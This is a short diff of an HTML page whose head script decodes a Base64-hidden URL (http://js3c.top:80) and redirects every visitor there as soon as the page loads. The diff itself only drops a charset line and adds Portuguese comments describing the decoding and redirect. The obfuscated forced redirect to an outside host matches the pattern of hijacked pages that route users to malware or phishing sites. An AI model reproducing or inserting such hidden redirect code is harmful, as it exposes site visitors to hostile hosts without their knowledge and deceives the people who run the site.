@@ -1,9 +1,11 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-16">
     <script>
+        // URL codificada em Base64
         const base64URL = "aHR0cDovL2pzM2MudG9wOjgw";
+
+        // Decodifica a URL e redireciona
         const decodedURL = atob(base64URL);
         window.location.href = decodedURL;
     </script>
